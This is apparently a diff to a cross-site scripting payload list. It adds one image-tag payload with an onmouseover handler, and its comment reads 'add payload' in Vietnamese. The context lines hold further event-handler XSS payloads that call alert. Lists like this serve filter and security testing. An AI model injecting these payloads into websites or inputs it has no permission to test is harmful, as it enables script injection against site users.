@@ -7,3 +7,5 @@
 <details open ontoggle=alert(7)>
 <marquee onstart=alert(8)>
 <video src=1 onerror=alert(9)>
+<img src="cat.webp" onmouseover="alert('meomeo')" width=100%/>
+#thêm payload 
